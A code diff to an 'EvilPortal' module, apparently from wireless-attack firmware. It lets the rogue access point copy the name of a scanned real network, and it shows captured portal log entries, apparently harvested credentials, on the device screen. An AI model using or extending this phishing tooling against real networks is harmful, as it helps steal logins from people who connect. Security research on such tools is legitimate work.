@@ -12,7 +12,7 @@ EvilPortal::EvilPortal() {
 
 bool EvilPortal::begin(LinkedList<ssid>* ssids) {
   // wait for init flipper input
-  if (!this->setAP())
+  if (!this->setAP(ssids))
     return false;
   if (!this->setHtml())
     return false;
@@ -103,48 +103,69 @@ bool EvilPortal::setHtml() {
 
 }
 
-bool EvilPortal::setAP() {
-  #ifndef WRITE_PACKETS_SERIAL
-    File ap_config_file = sd_obj.getFile("/ap.config.txt");
-    if (!ap_config_file) {
-      #ifdef HAS_SCREEN
-        display_obj.tft.setCursor(0, 100);
-        display_obj.tft.setFreeFont(NULL);
-        display_obj.tft.setTextSize(1);
-        display_obj.tft.println("Could not find /ap.config.txt.\nTouch to exit...");
-      #endif
-      Serial.println("Could not find /ap.config.txt. Exiting...");
-      return false;
-    }
-    else {
-      if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
+bool EvilPortal::setAP(LinkedList<ssid>* ssids) {
+  String ap_config = "";
+  if (ssids->size() <= 0) {
+    #ifndef WRITE_PACKETS_SERIAL
+      File ap_config_file = sd_obj.getFile("/ap.config.txt");
+      if (!ap_config_file) {
         #ifdef HAS_SCREEN
           display_obj.tft.setCursor(0, 100);
           display_obj.tft.setFreeFont(NULL);
           display_obj.tft.setTextSize(1);
-          display_obj.tft.println("The provided AP name is too large.");
-          display_obj.tft.println("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
-          display_obj.tft.println("Touch to exit...");
+          display_obj.tft.println("Could not find /ap.config.txt.\nTouch to exit...");
         #endif
-        Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE);
+        Serial.println("Could not find /ap.config.txt. Exiting...");
         return false;
       }
-      String ap_config = "";
-      while (ap_config_file.available()) {
-        char c = ap_config_file.read();
-        Serial.print(c);
-        if (isPrintable(c))
-          ap_config.concat(c);
+      else {
+        if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
+          #ifdef HAS_SCREEN
+            display_obj.tft.setCursor(0, 100);
+            display_obj.tft.setFreeFont(NULL);
+            display_obj.tft.setTextSize(1);
+            display_obj.tft.println("The provided AP name is too large.");
+            display_obj.tft.println("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
+            display_obj.tft.println("Touch to exit...");
+          #endif
+          Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE);
+          return false;
+        }
+        while (ap_config_file.available()) {
+          char c = ap_config_file.read();
+          Serial.print(c);
+          if (isPrintable(c))
+            ap_config.concat(c);
+        }
+        ap_config_file.close();
       }
-      strncpy(this->apName, ap_config.c_str(), strlen(ap_config.c_str()));
-      this->has_ap = true;
-      Serial.println("ap config set");
-      ap_config_file.close();
-      return true;
+    #else
+      return false;
+    #endif
+  }
+  else {
+    ap_config = ssids->get(0).essid;
+    if (ap_config.length() > MAX_AP_NAME_SIZE) {
+      #ifdef HAS_SCREEN
+        display_obj.tft.setCursor(0, 100);
+        display_obj.tft.setFreeFont(NULL);
+        display_obj.tft.setTextSize(1);
+        display_obj.tft.println("The provided AP name is too large.");
+        display_obj.tft.println("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
+        display_obj.tft.println("Touch to exit...");
+      #endif
+      Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE);
+      return false;
     }
-  #else
+  }
+  if (ap_config != "") {
+    strncpy(this->apName, ap_config.c_str(), strlen(ap_config.c_str()));
+    this->has_ap = true;
+    Serial.println("ap config set");
+    return true;
+  }
+  else
     return false;
-  #endif
 
 }
 
@@ -232,6 +253,9 @@ void EvilPortal::main(uint8_t scan_mode) {
       String full_string = logValue1 + " " + logValue2 + "\n";
       Serial.print(full_string);
       this->addLog(full_string, full_string.length());
+      #ifdef HAS_SCREEN
+        this->sendToDisplay(full_string);
+      #endif
     }
   }
 }
